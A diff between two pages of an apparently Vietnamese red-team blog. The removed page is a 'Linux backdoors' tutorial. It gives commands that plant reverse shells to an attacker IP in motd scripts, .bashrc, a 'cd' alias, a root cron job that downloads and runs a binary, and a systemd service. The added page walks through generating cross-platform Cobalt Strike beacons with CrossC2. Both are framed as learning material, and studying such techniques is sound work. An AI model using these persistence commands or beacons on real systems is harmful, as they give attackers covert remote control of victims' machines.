@@ -5,16 +5,17 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="map[name:Quac Tran]">
-<meta name="description" content="Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell &amp;hellip;) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng." />
-<meta name="keywords" content=", infosec, linux" />
+<meta name="description" content="Introduce Config  Listener Generate beacon  Gen via command Gen via install plugin     Result References  Introduce   &amp;ldquo;Cobalt Strike is threat emulation software. Execute targeted attacks against modern enterprises with one of the most powerful network attack kits available to penetration testers. This is not compliance testing.&amp;rdquo;
+  Nếu như bạn từng sử dụng Cobalt Strike chắc cũng sẽ biết Cobalt Strike không hỗ trợ điều khiển từ xa Linux, MacOS, Android&amp;hellip; theo mặc định." />
+<meta name="keywords" content=", red-team, infosec" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
-<link rel="canonical" href="https://tranquac.github.io/posts/2021/06/linux-backdoors/" />
+<link rel="canonical" href="https://tranquac.github.io/posts/2021/11/crossc2-generate-cobaltstrikes-cross-platform-payload/" />
 
 
     <title>
         
-            Linux backdoors :: Tran Quac 
+            CrossC2 – Generate CobaltStrike’s Cross-Platform Payload :: Tran Quac 
         
     </title>
 
@@ -41,39 +42,42 @@
 
 
 
-<meta itemprop="name" content="Linux backdoors">
-<meta itemprop="description" content="Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell &hellip;) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng."><meta itemprop="datePublished" content="2021-06-28T00:00:00&#43;00:00" />
-<meta itemprop="dateModified" content="2021-06-28T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="627"><meta itemprop="image" content="https://raw.githubusercontent.com/tranquac/Blog_Image/master/avatar/2.jpg"/>
-<meta itemprop="keywords" content="infosec,linux," />
+<meta itemprop="name" content="CrossC2 – Generate CobaltStrike’s Cross-Platform Payload">
+<meta itemprop="description" content="Introduce Config  Listener Generate beacon  Gen via command Gen via install plugin     Result References  Introduce   &ldquo;Cobalt Strike is threat emulation software. Execute targeted attacks against modern enterprises with one of the most powerful network attack kits available to penetration testers. This is not compliance testing.&rdquo;
+  Nếu như bạn từng sử dụng Cobalt Strike chắc cũng sẽ biết Cobalt Strike không hỗ trợ điều khiển từ xa Linux, MacOS, Android&hellip; theo mặc định."><meta itemprop="datePublished" content="2021-11-03T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2021-11-03T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="430"><meta itemprop="image" content="https://raw.githubusercontent.com/tranquac/Blog_Image/master/avatar/2.jpg"/>
+<meta itemprop="keywords" content="red-team,infosec," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://raw.githubusercontent.com/tranquac/Blog_Image/master/avatar/2.jpg"/>
 
-<meta name="twitter:title" content="Linux backdoors"/>
-<meta name="twitter:description" content="Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell &hellip;) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng."/>
+<meta name="twitter:title" content="CrossC2 – Generate CobaltStrike’s Cross-Platform Payload"/>
+<meta name="twitter:description" content="Introduce Config  Listener Generate beacon  Gen via command Gen via install plugin     Result References  Introduce   &ldquo;Cobalt Strike is threat emulation software. Execute targeted attacks against modern enterprises with one of the most powerful network attack kits available to penetration testers. This is not compliance testing.&rdquo;
+  Nếu như bạn từng sử dụng Cobalt Strike chắc cũng sẽ biết Cobalt Strike không hỗ trợ điều khiển từ xa Linux, MacOS, Android&hellip; theo mặc định."/>
 
 
 
 
-    <meta property="og:title" content="Linux backdoors" />
-<meta property="og:description" content="Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell &hellip;) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng." />
+    <meta property="og:title" content="CrossC2 – Generate CobaltStrike’s Cross-Platform Payload" />
+<meta property="og:description" content="Introduce Config  Listener Generate beacon  Gen via command Gen via install plugin     Result References  Introduce   &ldquo;Cobalt Strike is threat emulation software. Execute targeted attacks against modern enterprises with one of the most powerful network attack kits available to penetration testers. This is not compliance testing.&rdquo;
+  Nếu như bạn từng sử dụng Cobalt Strike chắc cũng sẽ biết Cobalt Strike không hỗ trợ điều khiển từ xa Linux, MacOS, Android&hellip; theo mặc định." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://tranquac.github.io/posts/2021/06/linux-backdoors/" /><meta property="og:image" content="https://raw.githubusercontent.com/tranquac/Blog_Image/master/avatar/2.jpg"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-06-28T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2021-06-28T00:00:00&#43;00:00" />
-<meta property="og:see_also" content="https://tranquac.github.io/posts/2021/03/linux-privilege-escalation/" />
+<meta property="og:url" content="https://tranquac.github.io/posts/2021/11/crossc2-generate-cobaltstrikes-cross-platform-payload/" /><meta property="og:image" content="https://raw.githubusercontent.com/tranquac/Blog_Image/master/avatar/2.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-11-03T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-11-03T00:00:00&#43;00:00" />
 
 
 
 
+
+
+    <meta property="article:section" content="red-team" />
 
     <meta property="article:section" content="infosec" />
 
-    <meta property="article:section" content="linux" />
 
 
-
-    <meta property="article:published_time" content="2021-06-28 00:00:00 &#43;0000 UTC" />
+    <meta property="article:published_time" content="2021-11-03 00:00:00 &#43;0000 UTC" />
 
 
 
@@ -148,7 +152,7 @@
 
     <article>
       <h1 class="post-title">
-        <a href="https://tranquac.github.io/posts/2021/06/linux-backdoors/">Linux backdoors</a>
+        <a href="https://tranquac.github.io/posts/2021/11/crossc2-generate-cobaltstrikes-cross-platform-payload/">CrossC2 – Generate CobaltStrike’s Cross-Platform Payload</a>
       </h1>
 
       
@@ -158,61 +162,125 @@
       
 
       <div class="post-content">
-        <p>Trong thực tế khi có quyền truy cập vào mục tiêu(SSH, VNC, interactive shell &hellip;) thì việc để lại backdoor là một phần quan trọng để duy trì quyền truy cập vào hệ thống mục tiêu. Do đó, việc học một số kỹ thuật backdoor là điều cần thiết, không chỉ đối với những kẻ tấn công mà cả những người phòng thủ. Sau đây chúng ta sẽ tìm hiểu một số kĩ thuật backdoor thông dụng. Ở đây chúng ta chỉ thảo luận trong thế giới Linux!</p>
-<h3 id="backdoor-là-gì">Backdoor là gì?</h3>
-<p>Backdoor là một đoạn mã ẩn, script hay chương trình đặt trên máy mục tiêu phục vụ cho mục đích truy cập dài hạn vào mục tiêu của kẻ tấn công,với điều đó bạn không phải khai thác cùng một hệ thống hai lần. Nó chỉ đơn giản là cung cấp cho bạn quyền truy cập nhanh hơn và tức thì vào hệ thống.</p>
-<h3 id="1-ssh-keys">1. SSH Keys</h3>
-<p>SSH authorized_keys tập tin chứa một danh sách các ủy quyền người dùng / khóa công khai được phép đăng nhập vào một tài khoản cụ thể. Trong tệp này, những kẻ tấn công cũng có thể đặt các khóa công khai của chúng để tự cấp quyền và truy cập ngay vào hệ thống thông qua SSH.\</p>
-<h4 id="victim">Victim</h4>
-<p><code>ssh-keygen -t rsa</code><br>
--&gt; generate key pair<br>
-<code>cat /$(whoami)/.ssh/id_rsa.pub &gt; /$(whoami)/.ssh/authorized_keys</code><br>
--&gt; copy public key (id_rsa.pub) to authorized_keys</p>
-<h4 id="attacker">Attacker</h4>
-<p>Copy private key (id_rsa)<br>
-<code>chmod 600 id_rsa</code><br>
--&gt; set permission<br>
-<code>ssh -i id_rsa username@victim</code><br>
--&gt; ssh to victim<br>
-<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-key.PNG"></p>
-<h3 id="2-ssh-motd">2. SSH motd</h3>
-<p>motd (Tin nhắn trong ngày) là banner xuất hiện khi bạn đăng nhập vào máy bằng SSH. Đối với Ubuntu / Debian các tập lệnh motd có thể được tìm thấy tại /etc/update-motd.d. Theo mặc định, những người dùng khác không có quyền ghi trên thư mục đó.
-<code>cd /etc/update-motd.d &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt; 20-backdoor &amp;&amp; chmod +x 20-backdoor</code><br>
-Lưu ý: &amp; -&gt; run command in background
-<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/ssh-motd.PNG"></p>
-<h3 id="3-users-bashrc--interactive-session">3. User’s .bashrc — Interactive session</h3>
-<p>.bashrc là một trong những tập lệnh khởi động được sử dụng bởi Bourne shell bash (zsh là .zshrc). Nếu có người dùng sử dụng bashlàm trình bao đăng nhập của họ, thì tập lệnh sẽ được thực thi cho mỗi phiên tương tác mà họ khởi chạy.<br>
-<code>cd &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt;&gt; .bashrc</code><br>
-<code>cd &amp;&amp; echo -e '#!/bin/bash\nnc 192.168.66.105 4444 -e /bin/bash &amp;' &gt;&gt; .zshrc</code><br>
-sẽ nhận được reverse shell khi người dùng sử dụng lệnh <code>bash</code> hay <code>su username</code>
-<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/bashrc.PNG"></p>
-<h3 id="4-users-bashrc--aliases">4. User’s .bashrc — Aliases</h3>
-<p>Là một kẻ tấn công, chúng ta cũng có thể đặt backdoor trong bí danh của người dùng! Đây cũng là 1 phương pháp tôi rất thích.<br>
-<code>alias cd='$(nc 192.168.66.105 4444 -e /bin/bash &amp;); cd'</code><br>
--&gt; Chúng ta sẽ nhận được reverse shell mỗi khi người dùng sử dụng lệnh cd
-<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/alias.PNG">
-Dưới đây là một số backdoor phức tạp khác sử dụng bí danh:</p>
+        <ul>
+<li><a href="#introduce">Introduce</a></li>
+<li><a href="#config">Config</a>
 <ul>
-<li><a href="https://github.com/nisay759/sudo-backdoor">https://github.com/nisay759/sudo-backdoor</a></li>
-<li><a href="https://gist.github.com/ahhh/1d4bf832c5a88cc75adb">https://gist.github.com/ahhh/1d4bf832c5a88cc75adb</a></li>
+<li><a href="#listener">Listener</a></li>
+<li><a href="#generate-beacon">Generate beacon</a>
+<ul>
+<li><a href="#gen-via-command">Gen via command</a></li>
+<li><a href="#gen-via-install-plugin">Gen via install plugin</a></li>
 </ul>
-<h3 id="5-cron-jobs">5. Cron jobs</h3>
-<p>Cron là một tính năng từ OS like Linux / UNIX có thể được sử dụng để thực hiện định kỳ một công việc hoặc nhiệm vụ cụ thể giống như Task Scheduler trong Windows.<br>
-<code>echo '* * * * * root cd /tmp; wget 192.168.66.105:8000/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor' &gt; /etc/cron.d/backdoor</code>
-<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/cron.PNG"></p>
-<h3 id="6-backdoor-as-a-service-baas">6. Backdoor as a Service (BaaS)</h3>
-<p>Kẻ tấn công cũng có thể tạo một backdoor như một service (BaaS). Đây là một ví dụ về BaaS ( backdoor.service):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>Service<span style="color:#f92672">]</span>
-Type<span style="color:#f92672">=</span>simple
-User<span style="color:#f92672">=</span>root
-ExecStart<span style="color:#f92672">=</span>/bin/bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/192.168.66.105/4444 0&gt;&amp;1&#34;</span>
-<span style="color:#f92672">[</span>Install<span style="color:#f92672">]</span>
-WantedBy<span style="color:#f92672">=</span>multi-user.target
-</code></pre></div><p>Khi service được bắt đầu, nó khởi chạy một reverse shell cho kẻ tấn công.<br>
-<code>cd /etc/systemd/system &amp;&amp; systemctl start backdoor.service</code><br>
-Nó cũng có thể được kích hoạt khi enable.<br>
-<code>cd /etc/systemd/system &amp;&amp; systemctl enable backdoor.service</code>
-<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/linux_backdoor/service.PNG"></p>
+</li>
+</ul>
+</li>
+<li><a href="#result">Result</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<h2 id="introduce">Introduce</h2>
+<ul>
+<li>
+<p>&ldquo;Cobalt Strike is threat emulation software. Execute targeted attacks against modern enterprises with one of the most powerful network attack kits available to penetration testers. This is not compliance testing.&rdquo;</p>
+</li>
+<li>
+<p>Nếu như bạn từng sử dụng Cobalt Strike chắc cũng sẽ biết Cobalt Strike không hỗ trợ điều khiển từ xa Linux, MacOS, Android&hellip; theo mặc định.</p>
+</li>
+<li>
+<p>CrossC2 là một plugin mở rộng hỗ trợ Cobalt Strike điều khiển từ xa các máy chủ Linux, MacOS, Android&hellip;.Nó hỗ trợ các thư viện động do người dùng chỉ định, tải, thực thi các thư viện này.</p>
+</li>
+<li>
+<p>Bạn có thể xem chi tiết về dự án tại đây: <a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></p>
+</li>
+</ul>
+<h2 id="config">Config</h2>
+<h3 id="listener">Listener</h3>
+<ul>
+<li>
+<p>Đầu tiên chúng ta sẽ tạo một listener để lắng nghe kết nối từ xa</p>
+</li>
+<li>
+<p>Cobalt Strike -&gt; Listener</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG"></p>
+</li>
+<li>
+<p>Một điều đáng chú ý ở đây là CrossC2 hiện tại chỉ hỗ trợ Beacon Https. Vậy ta sẽ tạo Beacon HTTPS. Đối với các Beacon khác như HTTP sẽ không thể nhận kết nối.</p>
+</li>
+</ul>
+<h3 id="generate-beacon">Generate beacon</h3>
+<ul>
+<li>Ở đây sẽ có 2 phương phương pháp. Chúng ta có thể gen trực tiếp từ binaries mà tác giả đã compile bằng command hoặc install vào Cobalt Strike như một plugin phụ trợ để gen theo dạng Gui. Mình sẽ làm theo cả 2 cách:</li>
+</ul>
+<h4 id="gen-via-command">Gen via command</h4>
+<ul>
+<li>
+<p>Đầu tiên chúng ta sẽ tải binary về tại đây: <a href="https://github.com/gloxec/CrossC2/releases">https://github.com/gloxec/CrossC2/releases</a></p>
+</li>
+<li>
+<p>Cách sử dụng tác giả cũng đã nói rất chi tiết:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG"></p>
+</li>
+<li>
+<p>Vì phiên bản Cobalt Strike đang sử dụng là 4.4 nên để gen payload tôi sử dụng lệnh sau:</p>
+</li>
+<li>
+<p><code>./genCrossC2.Linux IP_Listener 4444 .cobaltstrike.beacon_keys null Linux x64 ./beacon_linux_test stager 4.4</code></p>
+</li>
+<li>
+<p>cobaltstrike.beacon_keys: được tạo trong cùng thư mục root của Cobalt Strike server khi tạo Listener từ đầu</p>
+</li>
+<li>
+<p>Sau khi chạy lệnh thành công tôi nhận được beacon mới trong thư mục hiện tại:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG"></p>
+</li>
+</ul>
+<h4 id="gen-via-install-plugin">Gen via install plugin</h4>
+<ul>
+<li>
+<p>Đầu tiên chúng ta sẽ tải về:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG"></p>
+</li>
+<li>
+<p>Và đừng quên tải xuống: <a href="https://github.com/gloxec/CrossC2/blob/cs4.1/CrossC2Kit/CrossC2Kit_Loader.cna">https://github.com/gloxec/CrossC2/blob/cs4.1/CrossC2Kit/CrossC2Kit_Loader.cna</a> (including memory loading and other functions)</p>
+</li>
+<li>
+<p>Trong CrossC2.cna chúng ta sẽ chỉnh sửa lại path đến binary gen payload và cobaltstrike.beacon_keys cho phù hợp:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG"></p>
+</li>
+<li>
+<p>Sau đó chúng ta sẽ tải plugin vào Cobalt Strike: Cobalt Strike -&gt; Script Manager -&gt; Load. Sau khi load xong chúng ta sẽ có thêm chức năng CrossC2 trên thanh Menu. Lúc này ta có thể sử dụng để gen payload:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG"></p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG"></p>
+</li>
+</ul>
+<h2 id="result">Result</h2>
+<ul>
+<li>
+<p>Sau khi download và thực thi payload tạo dựa trên command hay GUI trên máy chủ Linux:</p>
+</li>
+<li>
+<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG"></p>
+</li>
+<li>
+<p>Chúng ta có thể làm tương tự để nhận kết nối tự MacOS, Android&hellip;</p>
+</li>
+</ul>
+<h2 id="references">References</h2>
+<p>-<a href="https://gloxec.github.io/CrossC2/zh_cn/usage/genCross.html">https://gloxec.github.io/CrossC2/zh_cn/usage/genCross.html</a></p>
 
       </div>
     </article>
@@ -224,8 +292,8 @@ Nó cũng có thể được kích hoạt khi enable.<br>
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
 
+        <span class="tag"><a href="https://tranquac.github.io/tags/red-team/">red-team</a></span>
         <span class="tag"><a href="https://tranquac.github.io/tags/infosec/">infosec</a></span>
-        <span class="tag"><a href="https://tranquac.github.io/tags/linux/">linux</a></span>
         
     </p>
 
@@ -233,8 +301,8 @@ Nó cũng có thể được kích hoạt khi enable.<br>
     <p>
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
 
+        <span class="tag"><a href="https://tranquac.github.io/categories/red-team/">red-team</a></span>
         <span class="tag"><a href="https://tranquac.github.io/categories/infosec/">infosec</a></span>
-        <span class="tag"><a href="https://tranquac.github.io/categories/linux/">linux</a></span>
         
     </p>
 
@@ -247,7 +315,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        627 Words
+        430 Words
       </p>
 
       <p>
@@ -258,7 +326,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
           <line x1="3" y1="10" x2="21" y2="10"></line>
         </svg>
         
-          28286-06-28 07:00
+          30311-11-03 07:00
         
 
          
@@ -269,7 +337,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
       <hr />
       <div class="sharing-buttons">
         
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
     </div>
@@ -277,7 +345,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
       <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
@@ -286,7 +354,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Linux%20backdoors&amp;caption=Linux%20backdoors&amp;canonicalUrl=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=CrossC2%20%e2%80%93%20Generate%20CobaltStrike%e2%80%99s%20Cross-Platform%20Payload&amp;caption=CrossC2%20%e2%80%93%20Generate%20CobaltStrike%e2%80%99s%20Cross-Platform%20Payload&amp;canonicalUrl=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -295,7 +363,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=Linux%20backdoors&amp;body=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=CrossC2%20%e2%80%93%20Generate%20CobaltStrike%e2%80%99s%20Cross-Platform%20Payload&amp;body=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -303,7 +371,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f&amp;media=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f;description=Linux%20backdoors" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f&amp;media=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f11%2fcrossc2-generate-cobaltstrikes-cross-platform-payload%2f;description=CrossC2%20%e2%80%93%20Generate%20CobaltStrike%e2%80%99s%20Cross-Platform%20Payload" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -311,7 +379,7 @@ Nó cũng có thể được kích hoạt khi enable.<br>
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f&amp;title=Linux%20backdoors&amp;summary=Linux%20backdoors&amp;source=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f06%2flinux-backdoors%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
